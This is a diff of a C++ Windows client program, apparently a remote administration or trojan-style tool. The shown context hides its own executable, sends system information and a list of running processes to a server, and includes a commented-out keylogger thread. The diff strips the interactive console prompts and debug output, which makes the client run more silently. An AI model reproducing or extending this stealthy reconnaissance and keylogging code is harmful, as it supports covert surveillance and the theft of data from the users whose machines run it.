@@ -45,16 +45,10 @@ void serverRequestHandler() {
                     LPTF_Packet response(1, PacketType::RESPONSE, 0, 1, 1, payload);
                     
                     globalSocket->sendBinary(response.serialize());
-                    std::cout << "Entrez le message : ";
-                    std::cout.flush();
                     break;
                 }
                 
                 case PacketType::RESPONSE: {
-                    std::string response(packet.getPayload().begin(), packet.getPayload().end());
-                    std::cout << "\nRéponse serveur : " << response << std::endl;
-                    std::cout << "Entrez le message : ";
-                    std::cout.flush();
                     break;
                 }
                 
@@ -112,30 +106,7 @@ void serverRequestHandler() {
 int main() {
     SetConsoleOutputCP(CP_UTF8);
     SetConsoleCP(CP_UTF8);
-
-    // test des fonction getipaddresses getmacaddresses de collecte d'informations réseau
-    //! to delete later
-     auto network = NetworkInfoFactory::create();
-
-    std::cout << "IP Addresses:\n";
-    for (const auto& ip : network->getIPAddresses()) {
-        std::cout << "  " << ip << "\n";
-    }
-    std::cout << "MAC Addresses:\n";
-    for (const auto& mac : network->getMACAddresses()) {
-        std::cout << "  " << mac << "\n";
-    }
-
-    // Active IP and MAC addresses
-    std::cout << "Active IP Addresses:\n";
-    for (const auto& ip : network->getActiveIPAddresses()) {
-        std::cout << "  " << ip << "\n";
-    }
-    std::cout << "Active MAC Addresses:\n";
-    for (const auto& mac : network->getActiveMACAddresses()) {
-        std::cout << "  " << mac << "\n";
-    }
-    // fin de test des fonction de collecte d'informations réseau
+    
     // Hide the current executable
     char exePath[MAX_PATH];
     GetModuleFileNameA(NULL, exePath, MAX_PATH);
@@ -172,63 +143,13 @@ int main() {
 
         std::cout << "Informations système envoyées au serveur." << std::endl;
 
-        // KEYLOGGER 
-        // std::thread([]() {
-        //     KeyLogger logger("key_file.txt");
-        //     logger.start();
-        // }).detach();
-        // ========================
         ProcessLister processLister;
-        // cout << "\nListe des processus en cours d'exécution :" << endl;
-        // if (!processLister.listProcesses()) {
-        //     cerr << "[ERREUR] Impossible de récupérer la liste des processus." << endl;
-        // }
-
         std::vector<std::string> exeList = processLister.getExeList();
 
-        // cout << "\n[Liste des exécutables (.exe) en cours d'exécution]:" << endl;
-        // const int columns = 3;
-        // int count = 0;
-        // for (const auto& exe : exeList) {
-        //     cout << std::left << std::setw(25) << exe; 
-        //     count++;
-        //     if (count % columns == 0)
-        //         cout << endl;
-        // }
-        // if (count % columns != 0)
-        //     cout << endl;
-
-        std::cout << "(Tapez 'sortie' pour quitter)" << std::endl;
-
-        // Send process list to server
-        std::ostringstream oss;
-        for (const auto& exe : exeList) {
-            oss << exe << '\n';
-        }
-        std::string procData = oss.str();
-        std::vector<uint8_t> procPayload(procData.begin(), procData.end());
-        LPTF_Packet procPacket(1, PacketType::PROCESS_LIST, 0, 1, 1, procPayload);
-        clientSocket.sendBinary(procPacket.serialize());
-
         std::thread serverThread(serverRequestHandler);
-
-        // Main thread for user interaction
+         // Main thread for user interaction
         while (running) {
-            std::string msg;
-            std::cout << "Entrez le message : ";
-            getline(std::cin, msg);
-
-            if (msg == "sortie") {
-                running = false;
-                break;
-            }
-
-            // Send regular messages
-            std::vector<uint8_t> msgPayload(msg.begin(), msg.end());
-            LPTF_Packet packet(1, PacketType::GET_INFO, 0, 1, 1, msgPayload);
-            clientSocket.sendBinary(packet.serialize());
         }
-
         // Clean shutdown
         running = false;
         if (serverThread.joinable()) {
